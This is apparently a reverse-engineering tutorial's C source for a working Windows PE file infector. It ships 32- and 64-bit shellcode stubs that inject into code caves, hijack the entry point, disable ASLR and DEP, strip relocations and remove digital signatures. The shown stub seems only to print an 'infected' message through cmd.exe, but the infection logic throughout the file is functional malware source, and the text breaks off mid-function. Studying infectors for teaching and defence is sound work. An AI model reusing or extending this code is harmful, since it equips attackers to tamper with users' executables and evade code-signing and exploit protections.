//
// reFundamentals
// Copyright (c) 2019 Adam Podlosky
//
// Part 4, Example 1 - PE File Infection
//
// Example of a simple PE file infector.
//
// Infection process:
//  1) Locate a code cave (unused space)
//  2) Convert cave offset to RVA
//  3) Set entry point to the code cave RVA
//  4) Convert OEP RVA to VA (add image-base)
//  5) Write OEP VA into stub's return address
//  6) Write stub into code cave
//  7) Update section flags of code cave
//
// Possible future enhancements:
//  - More interesting stubs/payloads
//  - ASLR support in stub, or relative jumps
//  - Multi-cave support (i.e. split up single stub into separate functions)
//  - Cave selection improvements
//  - Add section if no caves are available
//

#define WIN32_LEAN_AND_MEAN
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "infector.h"

// Output header
static const CHAR *m_header =
"              _____          __             _\n"
"             |_   _|        / _|           | |\n"
" _ __    ___   | |   _ __  | |_  ___   ___ | |_  ___   _ __\n"
"| \'_ \\  / _ \\  | |  | \'_ \\ |  _|/ _ \\ / __|| __|/ _ \\ | \'__|\n"
"| |_) ||  __/ _| |_ | | | || | |  __/| (__ | |_| (_) || |\n"
"| .__/  \\___||_____||_| |_||_|  \\___| \\___| \\__|\\___/ |_|\n"
"| |\n"
"|_|\n";

// Machine code from assembled stub32.asm
static const BYTE m_stub32[] = {
    0x55, 0x56, 0x57, 0x81, 0xEC, 0x94, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x30,
    0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x33, 0xED, 0x8B,
    0xCD, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x70, 0x10, 0x8B, 0x46, 0x3C, 0x8B,
    0x54, 0x30, 0x78, 0x03, 0xD6, 0x8B, 0x7A, 0x20, 0x03, 0xFE, 0x39, 0x4A,
    0x18, 0x0F, 0x86, 0x05, 0x01, 0x00, 0x00, 0x53, 0x8B, 0x04, 0x8F, 0x03,
    0xC6, 0x81, 0x38, 0x43, 0x72, 0x65, 0x61, 0x75, 0x23, 0x81, 0x78, 0x04,
    0x74, 0x65, 0x50, 0x72, 0x75, 0x1A, 0x81, 0x78, 0x08, 0x6F, 0x63, 0x65,
    0x73, 0x75, 0x11, 0xBB, 0x73, 0x41, 0x00, 0x00, 0x66, 0x39, 0x58, 0x0C,
    0x75, 0x06, 0x80, 0x78, 0x0E, 0x00, 0x74, 0x0B, 0x41, 0x3B, 0x4A, 0x18,
    0x72, 0xCA, 0xE9, 0xC8, 0x00, 0x00, 0x00, 0x8B, 0x42, 0x24, 0x8D, 0x04,
    0x48, 0x0F, 0xB7, 0x0C, 0x30, 0x8B, 0x42, 0x1C, 0x8D, 0x04, 0x88, 0x8B,
    0x14, 0x30, 0x03, 0xD6, 0x6A, 0x10, 0x59, 0x6A, 0x44, 0x5E, 0xB8, 0x65,
    0x63, 0x68, 0x6F, 0xC7, 0x44, 0x24, 0x10, 0x63, 0x6D, 0x64, 0x2E, 0x89,
    0x44, 0x24, 0x1C, 0x8D, 0x7C, 0x24, 0x50, 0x89, 0x44, 0x24, 0x40, 0x32,
    0xC0, 0xF3, 0xAA, 0x8D, 0x7C, 0x24, 0x60, 0xC7, 0x44, 0x24, 0x14, 0x65,
    0x78, 0x65, 0x20, 0x8B, 0xCE, 0xC7, 0x44, 0x24, 0x18, 0x2F, 0x63, 0x20,
    0x22, 0xF3, 0xAA, 0x8D, 0x44, 0x24, 0x50, 0xC7, 0x44, 0x24, 0x20, 0x20,
    0x54, 0x68, 0x69, 0x50, 0x8D, 0x44, 0x24, 0x64, 0xC7, 0x44, 0x24, 0x28,
    0x73, 0x20, 0x66, 0x69, 0x50, 0x55, 0x55, 0x6A, 0x10, 0x55, 0x55, 0x55,
    0x8D, 0x44, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x48, 0x6C, 0x65, 0x20, 0x68,
    0x50, 0x55, 0xC7, 0x44, 0x24, 0x54, 0x61, 0x73, 0x20, 0x62, 0xC7, 0x44,
    0x24, 0x58, 0x65, 0x65, 0x6E, 0x20, 0xC7, 0x44, 0x24, 0x5C, 0x69, 0x6E,
    0x66, 0x65, 0xC7, 0x44, 0x24, 0x60, 0x63, 0x74, 0x65, 0x64, 0xC7, 0x44,
    0x24, 0x64, 0x21, 0x20, 0x26, 0x20, 0xC7, 0x44, 0x24, 0x6C, 0x2E, 0x20,
    0x26, 0x20, 0xC7, 0x44, 0x24, 0x70, 0x70, 0x61, 0x75, 0x73, 0xC7, 0x44,
    0x24, 0x74, 0x65, 0x22, 0x00, 0x00, 0x89, 0xB4, 0x24, 0x88, 0x00, 0x00,
    0x00, 0xFF, 0xD2, 0x5B, 0x5F, 0x5E, 0x5D, 0x81, 0xC4, 0x94, 0x00, 0x00,
    0x00, 0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xC3
};

// Machine code from assembled stub64.asm
static const BYTE m_stub64[] = {
    0x57, 0x48, 0x81, 0xEC, 0x10, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04,
    0x25, 0x60, 0x00, 0x00, 0x00, 0x45, 0x33, 0xDB, 0x41, 0x8B, 0xD3, 0x48,
    0x8B, 0x48, 0x18, 0x48, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x08, 0x48, 0x8B,
    0x01, 0x48, 0x8B, 0x78, 0x20, 0x48, 0x63, 0x47, 0x3C, 0x44, 0x8B, 0x8C,
    0x38, 0x88, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xCF, 0x41, 0x8B, 0x49, 0x20,
    0x45, 0x8B, 0x41, 0x18, 0x48, 0x03, 0xCF, 0x45, 0x85, 0xC0, 0x0F, 0x84,
    0x46, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x73, 0x41, 0x00, 0x00, 0x8B, 0x01,
    0x48, 0x03, 0xC7, 0x81, 0x38, 0x43, 0x72, 0x65, 0x61, 0x75, 0x1F, 0x81,
    0x78, 0x04, 0x74, 0x65, 0x50, 0x72, 0x75, 0x16, 0x81, 0x78, 0x08, 0x6F,
    0x63, 0x65, 0x73, 0x75, 0x0D, 0x66, 0x44, 0x39, 0x50, 0x0C, 0x75, 0x06,
    0x44, 0x38, 0x58, 0x0E, 0x74, 0x10, 0xFF, 0xC2, 0x48, 0x83, 0xC1, 0x04,
    0x41, 0x3B, 0xD0, 0x72, 0xC9, 0xE9, 0x04, 0x01, 0x00, 0x00, 0x41, 0x8B,
    0x41, 0x24, 0x48, 0x03, 0xC7, 0x8B, 0xCA, 0x0F, 0xB7, 0x14, 0x48, 0x41,
    0x8B, 0x49, 0x1C, 0x48, 0x03, 0xCF, 0x44, 0x8B, 0x14, 0x91, 0x4C, 0x03,
    0xD7, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x50, 0x63, 0x6D, 0x64, 0x2E, 0x48,
    0x8D, 0xBC, 0x24, 0x90, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x54, 0x65,
    0x78, 0x65, 0x20, 0xB9, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x58,
    0x2F, 0x63, 0x20, 0x22, 0xF3, 0xAA, 0x48, 0x8D, 0x84, 0x24, 0xF8, 0x00,
    0x00, 0x00, 0xC7, 0x44, 0x24, 0x5C, 0x65, 0x63, 0x68, 0x6F, 0x48, 0x89,
    0x44, 0x24, 0x48, 0x48, 0x8D, 0x54, 0x24, 0x50, 0x48, 0x8D, 0x84, 0x24,
    0x90, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x20, 0x54, 0x68, 0x69,
    0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x4C, 0x89, 0x5C, 0x24,
    0x38, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x33, 0xC9, 0xC7,
    0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x44, 0x89, 0x5C, 0x24, 0x20,
    0xC7, 0x44, 0x24, 0x64, 0x73, 0x20, 0x66, 0x69, 0xC7, 0x44, 0x24, 0x68,
    0x6C, 0x65, 0x20, 0x68, 0xC7, 0x44, 0x24, 0x6C, 0x61, 0x73, 0x20, 0x62,
    0xC7, 0x44, 0x24, 0x70, 0x65, 0x65, 0x6E, 0x20, 0xC7, 0x44, 0x24, 0x74,
    0x69, 0x6E, 0x66, 0x65, 0xC7, 0x44, 0x24, 0x78, 0x63, 0x74, 0x65, 0x64,
    0xC7, 0x44, 0x24, 0x7C, 0x21, 0x20, 0x26, 0x20, 0xC7, 0x84, 0x24, 0x80,
    0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6F, 0xC7, 0x84, 0x24, 0x84, 0x00,
    0x00, 0x00, 0x2E, 0x20, 0x26, 0x20, 0xC7, 0x84, 0x24, 0x88, 0x00, 0x00,
    0x00, 0x70, 0x61, 0x75, 0x73, 0xC7, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00,
    0x65, 0x22, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x68,
    0x00, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0x48, 0xB8, 0xDD, 0xDD, 0xDD, 0xDD,
    0xDD, 0xDD, 0xDD, 0xDD, 0x48, 0x81, 0xC4, 0x10, 0x01, 0x00, 0x00, 0x5F,
    0x50, 0xC3
};

//
// Finds a byte value in the specified range of the given buffer.
// Returns MAXSIZE_T if not found, otherwise its offset if found.
//
static inline SIZE_T findByteOffset(BYTE value, const VOID *buffer, SIZE_T startOffset, SIZE_T endOffset)
{
    const BYTE  *bytes;
    SIZE_T      offset;

    assert(buffer != NULL);
    assert(startOffset <= endOffset);

    bytes = buffer;
    for (offset = startOffset; offset < endOffset; offset++) {
        if (bytes[offset] == value) {
            return offset;
        }
    }
    return MAXSIZE_T;
}

//
// Finds a 32-bit integer value in the given buffer (memchr() but 32bit).
// Returns NULL if not found, or a pointer to the value if found.
//
static UINT32 *findInt32(UINT32 value, const VOID *buffer, SIZE_T length)
{
    const BYTE *p;

    assert(buffer != NULL);

    p = buffer;
    while (length-- > 0) {
        if (*(UINT32 *)p == value) {
            return (UINT32 *)p;
        }
        p++;
    }
    return NULL;
}

//
// Finds a 64-bit integer value in the given buffer (memchr() but 64bit).
// Returns NULL if not found, or a pointer to the value if found.
//
static UINT64 *findInt64(UINT64 value, const VOID *buffer, SIZE_T length)
{
    const BYTE *p;

    assert(buffer != NULL);

    p = buffer;
    while (length-- > 0) {
        if (*(UINT64 *)p == value) {
            return (UINT64 *)p;
        }
        p++;
    }
    return NULL;
}

//
// Opens and maps a file into memory (NOT a 'mapped PE').
//
static BOOL mappedOpen(const CHAR *path, MAPPED_FILE *mapped)
{
    HANDLE          file;
    HANDLE          map;
    VOID            *view;
    LARGE_INTEGER   size;

    assert(path != NULL);
    assert(mapped != NULL);

    printf("Opening file for R/W and mapping it...\n");

    file = CreateFileA(path, GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        printf("- Unable to open file (error %u)\n", GetLastError());
        return FALSE;
    }

    if (!GetFileSizeEx(file, &size)) {
        printf("- Unable to retrieve file size (error %u)\n", GetLastError());

        CloseHandle(file);
        return FALSE;
    }

    if (size.QuadPart > 0x40000000) {
        printf("- File size is too large (1GB max)\n");

        CloseHandle(file);
        return FALSE;
    }

    map = CreateFileMapping(file, NULL, PAGE_READWRITE, 0, size.LowPart, NULL);
    if (map == NULL) {
        printf("- Unable to map file (error %u)\n", GetLastError());

        CloseHandle(file);
        return FALSE;
    }

    view = MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, size.LowPart);
    if (view == NULL) {
        printf("- Unable to map view (error %u)\n", GetLastError());

        CloseHandle(map);
        CloseHandle(file);
        return FALSE;
    }

    mapped->file = file;
    mapped->map  = map;
    mapped->view = view;
    mapped->size = size.LowPart;

    printf("- File mapped at 0x%p (%zu bytes)\n", mapped->view, mapped->size);
    return TRUE;
}

//
// Unmaps and closes a previously mapped file.
//
static BOOL mappedClose(MAPPED_FILE *mapped)
{
    assert(mapped != NULL);

    // Seems worthwhile to call FlushViewOfFile() before unmapping
    // https://docs.microsoft.com/en-us/windows/desktop/Memory/closing-a-file-mapping-object
    FlushViewOfFile(mapped->view, 0);

    UnmapViewOfFile(mapped->view);
    CloseHandle(mapped->map);
    CloseHandle(mapped->file);

    ZeroMemory(mapped, sizeof(MAPPED_FILE));
    return TRUE;
}

//
// Additional validation for the Optional Header.
//
static BOOL peValidateOptHeader(BOOL is64, VOID *ntHdr)
{
    DWORD               optMagicAct;
    DWORD               optMagicReq;
    DWORD               optSizeAct;
    DWORD               optSizeMin;
    DWORD               optDataDirs;
    IMAGE_NT_HEADERS32  *nt32;
    IMAGE_NT_HEADERS64  *nt64;

    assert(ntHdr != NULL);

    if (is64) {
        nt64 = ntHdr;
        optMagicAct = nt64->OptionalHeader.Magic;
        optMagicReq = IMAGE_NT_OPTIONAL_HDR64_MAGIC;

        optSizeAct  = nt64->FileHeader.SizeOfOptionalHeader;
        optSizeMin  = offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);
        optDataDirs = nt64->OptionalHeader.NumberOfRvaAndSizes;
    } else {
        nt32 = ntHdr;
        optMagicAct = nt32->OptionalHeader.Magic;
        optMagicReq = IMAGE_NT_OPTIONAL_HDR32_MAGIC;

        optSizeAct  = nt32->FileHeader.SizeOfOptionalHeader;
        optSizeMin  = offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory);
        optDataDirs = nt32->OptionalHeader.NumberOfRvaAndSizes;
    }

    if (optMagicAct != optMagicReq) {
        printf("- Invalid optional header magic (actual %X, required %X)\n",
            optMagicAct, optMagicReq);
        return FALSE;
    }

    if (optSizeAct < optSizeMin) {
        printf("- Invalid optional header size (actual %u, minimum %u)\n",
            optSizeAct, optSizeMin);
        return FALSE;
    }

    if (optDataDirs > IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
        printf("- Invalid data directory size (actual %u, maximum %u)\n",
            optDataDirs, IMAGE_NUMBEROF_DIRECTORY_ENTRIES);
        return FALSE;
    }

    return TRUE;
}

//
// Retrieves a copy of the 32-bit or 64-bit code stub.
// Returns NULL on failure or a pointer to a INFECT_STUB on success, must be freed.
//
static INFECT_STUB *stubGetCopy(BOOL use64)
{
    INFECT_STUB *stub;
    const BYTE *data;
    SIZE_T      dataLength;
    UINT_PTR    offset;

    printf("Duplicating code stub...\n");

    if (use64) {
        data = m_stub64;
        dataLength = sizeof(m_stub64);
    } else {
        data = m_stub32;
        dataLength = sizeof(m_stub32);
    }
    printf("- Stub (%d-bit) size is %zu bytes\n", use64 ? 64 : 32, dataLength);

    stub = calloc(1, sizeof(INFECT_STUB) + dataLength);
    if (stub == NULL) {
        printf("- Memory allocation failed\n");
        return NULL;
    }
    stub->is64   = use64;
    stub->code   = &stub[1];
    stub->length = dataLength;
    CopyMemory(stub->code, data, dataLength);

    // TODO: refactor and add support for multiple dummy values for multi-cave stubs

    // Locate dummy OEP
    if (use64) {
        stub->dummy64 = findInt64(OEP_DUMMY64, stub->code, stub->length);
        if (stub->dummy64 != NULL) {
            offset = (UINT_PTR)stub->dummy64 - (UINT_PTR)stub->code;
            printf("- Stub's OEP placeholder is at offset 0x%zX (0x%016I64X)\n",
                offset, stub->dummy64[0]);
            return stub;
        }
    } else {
        stub->dummy32 = findInt32(OEP_DUMMY32, stub->code, stub->length);
        if (stub->dummy32 != NULL) {
            offset = (UINT_PTR)stub->dummy64 - (UINT_PTR)stub->code;
            printf("- Stub's OEP placeholder is at offset 0x%zX (0x%08X)\n",
                offset, stub->dummy32[0]);
            return stub;
        }
    }

    printf("- Unable to locate OEP placeholder value\n");

    free(stub);
    return NULL;
}

//
// Parses header locations for the given mapped file. SOME validation, not much.
//
static BOOL peGetHeaders(MAPPED_FILE *mapped, PE_HEADERS *pe)
{
    BOOL                    is64 = FALSE;
    DWORD                   i;
    UINT64                  expectSize;
    IMAGE_DOS_HEADER        *dos;
    DWORD                   *ntSig;
    VOID                    *ntHdr;
    IMAGE_NT_HEADERS32      *nt32 = NULL;
    IMAGE_NT_HEADERS64      *nt64 = NULL;
    IMAGE_FILE_HEADER       *file;
    IMAGE_SECTION_HEADER    *section;

    assert(mapped != NULL);
    assert(pe != NULL);

    printf("Parsing PE headers..\n");

    expectSize = sizeof(IMAGE_DOS_HEADER);
    if (expectSize > mapped->size) {
        printf("- Invalid DOS header (expected %I64u, file size %zu)\n",
            expectSize, mapped->size);
        return FALSE;
    }

    dos = (IMAGE_DOS_HEADER *)mapped->view;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("- Invalid DOS signature\n");
        return FALSE;
    }

    expectSize += dos->e_lfanew;
    expectSize += sizeof(DWORD); // for Signature
    expectSize += sizeof(IMAGE_FILE_HEADER);
    if (expectSize > mapped->size) {
        printf("- Invalid NT header (expected %I64u, file size %zu)\n",
            expectSize, mapped->size);
        return FALSE;
    }

    ntHdr = RVA_TO_PTR(dos, dos->e_lfanew);
    ntSig = (DWORD *)ntHdr;
    if (*ntSig != IMAGE_NT_SIGNATURE) {
        printf("- Invalid NT signature\n");
        return FALSE;
    }

    // File header is immediately after the signature value
    file = (IMAGE_FILE_HEADER *)(ntSig + 1);
    if (file->Machine == IMAGE_FILE_MACHINE_I386) {
        is64 = FALSE;
        nt32 = (IMAGE_NT_HEADERS32 *)ntHdr;
    } else if (file->Machine == IMAGE_FILE_MACHINE_AMD64) {
        is64 = TRUE;
        nt64 = (IMAGE_NT_HEADERS64 *)ntHdr;
    } else {
        printf("- Unsupported PE machine architecture (%u)\n", file->Machine);
        return FALSE;
    }

    if (file->NumberOfSections < 1 || file->NumberOfSections > PE_MAX_SECTIONS) {
        printf("- Invalid number of sections (%u)\n", file->NumberOfSections);
        return FALSE;
    }

    expectSize += file->SizeOfOptionalHeader;
    expectSize += (file->NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    if (expectSize > mapped->size) {
        printf("- Invalid optional header/section table (expected %I64u, file size %zu)\n",
            expectSize, mapped->size);
        return FALSE;
    }

    if (!peValidateOptHeader(is64, ntHdr)) {
        return FALSE;
    }

    // IMAGE_FIRST_SECTION macro works on both 32-bit and 64-bit PEs since
    // the File Header is identical and in the same location
    section = IMAGE_FIRST_SECTION((IMAGE_NT_HEADERS *)ntHdr);
    for (i = 0; i < file->NumberOfSections; i++) {
        expectSize = section[i].PointerToRawData;
        expectSize += section[i].SizeOfRawData;

        if (expectSize > mapped->size) {
            printf("- Invalid section #%u size (expected %I64u, file size %zu)\n",
                i, expectSize, mapped->size);
            return FALSE;
        }
    }

    pe->is64 = is64;
    pe->dos  = dos;
    if (is64) {
        pe->nt64 = nt64;
    } else {
        pe->nt32 = nt32;
    }
    pe->file    = file;
    pe->section = section;

    printf("- PE file is x86-%d, contains %u section(s)\n",
        is64 ? 64 : 32, file->NumberOfSections);
    return TRUE;
}

//
// Locates a valid data directory for a given index.
// Returns NULL on failure, or a pointer to the data directory on success.
//
static IMAGE_DATA_DIRECTORY *peGetDataDirectory(PE_HEADERS *pe, DWORD index)
{
    DWORD                dataCount;
    IMAGE_DATA_DIRECTORY *dataDirs;
    IMAGE_DATA_DIRECTORY *dir;

    assert(pe != NULL);

    if (pe->is64) {
        dataCount = pe->nt64->OptionalHeader.NumberOfRvaAndSizes;
        dataDirs  = pe->nt64->OptionalHeader.DataDirectory;
    } else {
        dataCount = pe->nt32->OptionalHeader.NumberOfRvaAndSizes;
        dataDirs  = pe->nt32->OptionalHeader.DataDirectory;
    }

    if (index >= dataCount) {
        return NULL;
    }

    dir = &dataDirs[index];
    return (dir->VirtualAddress != 0 && dir->Size != 0) ? dir : NULL;
}

//
// Locates a section header for the given file offset.
// Returns NULL on failure, or a pointer to the section on success.
//
static IMAGE_SECTION_HEADER *peOffsetToSection(PE_HEADERS *pe, UINT32 offset)
{
    DWORD                   i;
    UINT32                  start;
    UINT32                  end;
    IMAGE_SECTION_HEADER    *section;

    assert(pe != NULL);

    for (i = 0; i < pe->file->NumberOfSections; i++) {
        section = &pe->section[i];
        start   = section->PointerToRawData;
        end     = start + section->SizeOfRawData;

        if ((offset >= start) && (offset < end)) {
            return section;
        }
    }
    return NULL;
}

//
// Calculates the relative virtual address (RVA) for a given file offset.
// Returns MAXUINT32 on failure, or the RVA on success.
//
static UINT32 peOffsetToRVA(PE_HEADERS *pe, UINT32 offset)
{
    IMAGE_SECTION_HEADER *section;

    assert(pe != NULL);

    section = peOffsetToSection(pe, offset);
    if (section != NULL) {
        return (offset - section->PointerToRawData) + section->VirtualAddress;
    }
    return MAXUINT32;
}

//
// Retrieves a list of code caves that are at least the minimum length.
// Returns NULL on failure, or a pointer to a PE_CAVE_LIST on success- must be
// freed with peCavesFree().
//
static PE_CAVE_LIST *peCavesFindAll(MAPPED_FILE *mapped, SIZE_T reqLength)
{
    const BYTE      *bytes;
    SIZE_T          bytesLength;
    SIZE_T          caveStart;
    SIZE_T          caveEnd;
    SIZE_T          caveLength;
    SIZE_T          caveCount;
    PE_CAVE_LIST    *list;
    PE_CAVE_ENTRY   *entry;

    assert(mapped != NULL);

    reqLength = ALIGN4(reqLength);
    printf("Searching for code caves, minimum %zu bytes...\n", reqLength);

    list = calloc(1, sizeof(PE_CAVE_LIST));
    if (list == NULL) {
        return NULL;
    }

    bytes = mapped->view;
    bytesLength = mapped->size;
    caveCount = 0;
    TAILQ_INIT(list);

    for (caveStart = caveLength = 0; caveStart < bytesLength; caveStart += caveLength) {
        // Find start of cave
        caveStart = findByteOffset(0x00, bytes, caveStart, bytesLength);
        if (caveStart == MAXSIZE_T) {
            // No null-bytes remaining
            break;
        }

        // Find end of cave (start at next byte)
        for (caveLength = 1; caveLength < reqLength; caveLength++) {
            caveEnd = caveStart + caveLength;
            if (caveEnd >= bytesLength || bytes[caveEnd] != 0x00) {
                break;
            }
        }

        if (caveLength >= reqLength) {
            //printf("- Found cave at offset 0x%zX-0x%zX (%zu bytes)\n",
            //    caveStart, caveStart + caveLength, caveLength);
            entry = calloc(1, sizeof(PE_CAVE_ENTRY));
            if (entry != NULL) {
                entry->offset = caveStart;
                entry->length = caveLength;
                TAILQ_INSERT_TAIL(list, entry, link);
                caveCount++;
            }

            // Next search should begin after this cave
            caveLength++;
        }
    }

    printf("- Found %zu potential code cave(s)\n", caveCount);
    return list;
}

//
// Frees a list of code caves.
//
static VOID peCavesFree(PE_CAVE_LIST *list)
{
    PE_CAVE_ENTRY *entry;

    assert(list != NULL);

    while (!TAILQ_EMPTY(list)) {
        entry = TAILQ_FIRST(list);
        TAILQ_REMOVE(list, entry, link);
        free(entry);
    }
    free(list);
}

//
// Retrieves the most-suitable code cave.
// Returns NULL on failure, or a pointer to a PE_CAVE_ENTRY on success - must
// be freed.
//
static PE_CAVE_ENTRY *peCavesFindBest(MAPPED_FILE *mapped, PE_HEADERS *pe, SIZE_T reqLength)
{
    PE_CAVE_LIST            *caveList;
    PE_CAVE_ENTRY           *cave;
    PE_CAVE_ENTRY           *bestCave;
    IMAGE_SECTION_HEADER    *section;
    IMAGE_SECTION_HEADER    *sectionEnd;

    assert(mapped != NULL);
    assert(pe != NULL);

    caveList = peCavesFindAll(mapped, reqLength);
    if (caveList == NULL) {
        return NULL;
    }

    bestCave = NULL;
    TAILQ_FOREACH(cave, caveList, link) {
        section = peOffsetToSection(pe, cave->offset);
        sectionEnd = peOffsetToSection(pe, cave->offset + cave->length);
        if (section == NULL || sectionEnd == NULL) {
            printf("- Bad cave at offset 0x%zX: start/end outside of section\n",
                cave->offset);
            continue;
        }
        if (section != sectionEnd) {
            printf("- Bad cave at offset 0x%zX: start/end in different sections\n",
                cave->offset);
            continue;
        }

        // TODO: better cave selection logic
        cave->section = section;
        cave->isData = (section->Characteristics &
            (IMAGE_SCN_CNT_INITIALIZED_DATA|IMAGE_SCN_CNT_UNINITIALIZED_DATA))
            ? TRUE : FALSE;
        cave->isExec = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            ? TRUE : FALSE;

        // Prefer a cave in a data section
        if (cave->isData) {
            // List is in file order, a cave near the end is preferred
            bestCave = cave;
        } else if (bestCave == NULL) {
            bestCave = cave;
        }
    }

    if (bestCave != NULL) {
        TAILQ_REMOVE(caveList, bestCave, link);

        printf("- Ideal code cave at offset 0x%zX (data:%c exec:%c section:%.*s)\n",
            bestCave->offset,
            bestCave->isData ? 'Y' : 'N',
            bestCave->isExec ? 'Y' : 'N',
            IMAGE_SIZEOF_SHORT_NAME, bestCave->section->Name);
    }

    peCavesFree(caveList);
    return bestCave;
}

//
// Writes stub and entry-point into the PE file.
//
static BOOL peInfectWriteStub(PE_HEADERS *pe, INFECT_STUB *stub, PE_CAVE_ENTRY *cave)
{
    UINT32  caveRVA;
    UINT32  oepRVA;
    UINT32  baseVA32;
    UINT64  baseVA64;
    UINT32  oepVA32;
    UINT64  oepVA64;

    assert(pe != NULL);
    assert(stub != NULL);
    assert(cave != NULL);

    caveRVA = peOffsetToRVA(pe, cave->offset);
    if (caveRVA == MAXUINT32) {
        printf("- Unable to map cave offset to RVA\n");
        return FALSE;
    }
    printf("- RVA of code cave is 0x%X\n", caveRVA);

    if (pe->is64) {
        oepRVA = pe->nt64->OptionalHeader.AddressOfEntryPoint;
        baseVA64 = pe->nt64->OptionalHeader.ImageBase;
        oepVA64 = baseVA64 + oepRVA;

        printf("- Image base 0x%016I64X, OEP 0x%016I64X (RVA 0x%X)\n",
            baseVA64, oepVA64, oepRVA);

        printf("- Setting stub return address to OEP 0x%016I64X\n", oepVA64);
        stub->dummy64[0] = oepVA64;

        printf("- Setting entry point to cave RVA 0x%X\n", caveRVA);
        pe->nt64->OptionalHeader.AddressOfEntryPoint = caveRVA;
    } else {
        oepRVA = pe->nt32->OptionalHeader.AddressOfEntryPoint;
        baseVA32 = pe->nt32->OptionalHeader.ImageBase;
        oepVA32 = baseVA32 + oepRVA;

        printf("- Image base 0x%08X, OEP 0x%08X (RVA 0x%X)\n",
            baseVA32, oepVA32, oepRVA);

        printf("- Setting stub return address to OEP 0x%08X\n", oepVA32);
        stub->dummy32[0] = oepVA32;

        printf("- Setting entry point to cave RVA 0x%X\n", caveRVA);
        pe->nt32->OptionalHeader.AddressOfEntryPoint = caveRVA;
    }

    printf("- Writing code stub (%zu bytes)\n", stub->length);
    CopyMemory(RVA_TO_PTR(pe->dos, cave->offset), stub->code, stub->length);

    return TRUE;
}

//
// Updates file-header and section characteristics.
//
static VOID peInfectUpdateFlags(PE_HEADERS *pe, INFECT_STUB *stub, PE_CAVE_ENTRY *cave)
{
    DWORD                flags;
    DWORD                *marker;
    DWORD                oldValue;
    DWORD                newValue;
    IMAGE_DATA_DIRECTORY *dataDir;

    assert(pe != NULL);
    assert(stub != NULL);
    assert(cave != NULL);

    printf("- Marking PE as infected in the DOS header\n");
    marker = RVA_TO_PTR(pe->dos, MARKER_OFFSET);
    *marker = MARKER_VALUE;

    printf("- Removing dynamic base (ASLR) and NX (DEP) flags\n");
    flags = ~((DWORD)(IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE|
                      IMAGE_DLLCHARACTERISTICS_NX_COMPAT));
    if (pe->is64) {
        pe->nt64->OptionalHeader.DllCharacteristics &= flags;
    } else {
        pe->nt32->OptionalHeader.DllCharacteristics &= flags;
    }

    // SizeOfRawData will already include the padded bytes, should only have to
    // increase the virtual size to include the stub
    oldValue = cave->section->Misc.VirtualSize;
    newValue = oldValue + stub->length;
    printf("- Increasing section size (%u to %u)\n", oldValue, newValue);
    cave->section->Misc.VirtualSize = newValue;

    // Set section as read/execute and remove discardable
    newValue = oldValue = cave->section->Characteristics;
    newValue |= IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE;
    newValue &= ~((DWORD)IMAGE_SCN_MEM_DISCARDABLE);
    printf("- Changing section flags (%08X to %08X)\n", oldValue, newValue);
    cave->section->Characteristics = newValue;

    // Remove relocation directory (also disables ASLR)
    dataDir = peGetDataDirectory(pe, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (dataDir != NULL) {
        printf("- Removing relocation table\n");
        dataDir->VirtualAddress = 0;
        dataDir->Size = 0;
        pe->file->Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
    }

    // Remove signature if the binary is signed
    dataDir = peGetDataDirectory(pe, IMAGE_DIRECTORY_ENTRY_SECURITY);
    if (dataDir != NULL) {
        printf("- Removing digital signature\n");
        dataDir->VirtualAddress = 0;
        dataDir->Size = 0;
    }
}

//
// Infects the given PE file.
//
static BOOL peInfect(MAPPED_FILE *mapped, PE_HEADERS *pe)
{
    BOOL            result = FALSE;
    INFECT_STUB     *stub;
    PE_CAVE_ENTRY   *cave;

    stub = stubGetCopy(pe->is64);
    if (stub == NULL) {
        printf("Stub duplication failed\n");
        return FALSE;
    }

    cave = peCavesFindBest(mapped, pe, stub->length);
    if (cave == NULL) {
        printf("No suitable code cave found\n");
    } else {
        printf("Infecting PE file...\n");
        if (peInfectWriteStub(pe, stub, cave)) {

            printf("Updating PE flags...\n");
            peInfectUpdateFlags(pe, stub, cave);
            result = TRUE;
        }
        free(cave);
    }

    free(stub);
    return result;
}

//
// Determines if the PE file is supported.
//
static BOOL peIsSupported(PE_HEADERS *pe)
{
    DWORD flags;
    DWORD *marker;

    flags = pe->file->Characteristics;

    if (!(flags & IMAGE_FILE_EXECUTABLE_IMAGE)) {
        printf("PE file is not an executable\n");
        return FALSE;
    }

    if (flags & IMAGE_FILE_DLL) {
        printf("PE file is a DLL, must be an executable\n");
        return FALSE;
    }

